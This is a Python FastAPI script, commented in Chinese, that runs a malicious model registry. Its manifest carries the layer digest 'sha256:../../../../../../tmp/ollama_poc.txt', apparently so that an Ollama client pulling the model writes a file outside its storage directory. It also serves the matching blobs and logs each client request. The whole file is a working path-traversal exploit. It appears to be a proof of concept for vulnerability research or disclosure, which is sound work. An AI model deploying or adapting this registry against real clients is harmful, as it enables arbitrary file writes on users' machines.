#!/usr/bin/env python3
"""registry：layer digest 固定为路径穿越值"""
import hashlib, json
from fastapi import FastAPI, Request, Response

app = FastAPI()
LOGS = []

MODEL_BLOB = b"GGUF" + b"\x00" * 60 + b"ORKESTR-PAYLOAD-REGISTRY"
CONFIG_BLOB = json.dumps({
    "model_format": "gguf", "model_family": "llama",
    "model_families": ["llama"], "model_type": "3B",
    "file_type": "Q4_K_M", "architectures": ["llama"], "os": "linux",
}).encode()

H_MODEL = hashlib.sha256(MODEL_BLOB).hexdigest()
H_CONFIG = hashlib.sha256(CONFIG_BLOB).hexdigest()
BLOBS = {H_MODEL: MODEL_BLOB, H_CONFIG: CONFIG_BLOB}
BASE = "https://regsvc.orkestr.run"

# 路径穿越 digest
LAYER_DIGEST = "sha256:../../../../../../tmp/ollama_poc.txt"

def manifest_body():
    return json.dumps({
        "schemaVersion": 2,
        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
        "config": {"mediaType": "application/vnd.docker.container.image.v1+json",
                   "digest": "sha256:" + H_CONFIG, "size": len(CONFIG_BLOB)},
        "layers": [{"mediaType": "application/vnd.ollama.image.model",
                    "digest": LAYER_DIGEST, "size": len(MODEL_BLOB)}],
    })

@app.middleware("http")
async def mw(request: Request, call_next):
    LOGS.append({"m": request.method, "p": request.url.path[:160],
                 "ua": (request.headers.get("user-agent") or "")[:45]})
    if len(LOGS) > 400: del LOGS[:100]
    return await call_next(request)

@app.get("/logs")
def logs():
    return {"n": len(LOGS), "layer": LAYER_DIGEST, "logs": LOGS[-100:]}

@app.post("/logs/clear")
def clear():
    LOGS.clear(); return {"ok": True}

@app.get("/")
def root():
    return {"status": "ok", "layer": LAYER_DIGEST}

@app.get("/v2/")
def v2():
    return Response(status_code=200, headers={"Docker-Distribution-Api-Version": "registry/2.0"})

@app.api_route("/v2/{ns}/{repo}/manifests/{tag}", methods=["GET","HEAD"])
def manifest(ns: str, repo: str, tag: str, request: Request):
    body = manifest_body()
    dg = "sha256:" + hashlib.sha256(body.encode()).hexdigest()
    hdr = {"Docker-Content-Digest": dg, "Content-Length": str(len(body)),
           "Location": BASE + "/v2/" + ns + "/" + repo + "/manifests/" + dg}
    if request.method == "HEAD":
        return Response(status_code=200, media_type="application/vnd.docker.distribution.manifest.v2+json", headers=hdr)
    return Response(content=body, media_type="application/vnd.docker.distribution.manifest.v2+json", headers=hdr)

@app.api_route("/v2/{ns}/{repo}/blobs/{digest:path}", methods=["GET","HEAD"])
def blob(ns: str, repo: str, digest: str, request: Request):
    key = digest.replace("sha256:", "")
    data = BLOBS.get(key) or MODEL_BLOB
    hdr = {"Content-Length": str(len(data)),
           "Location": BASE + "/content/" + key.replace("/", "_").replace("..", "__"),
           "Docker-Content-Digest": "sha256:" + key, "Accept-Ranges": "bytes"}
    if request.method == "HEAD":
        return Response(status_code=200, headers=hdr)
    return Response(content=data, media_type="application/octet-stream", headers=hdr)

@app.api_route("/content/{key:path}", methods=["GET","HEAD"])
def content(key: str, request: Request):
    k = key.replace("__", "..").replace("_", "/")
    data = BLOBS.get(k) or MODEL_BLOB
    hdr = {"Content-Length": str(len(data)), "Location": BASE + "/content/" + key,
           "Accept-Ranges": "bytes"}
    if request.method == "HEAD":
        return Response(status_code=200, headers=hdr)
    return Response(content=data, media_type="application/octet-stream", headers=hdr)
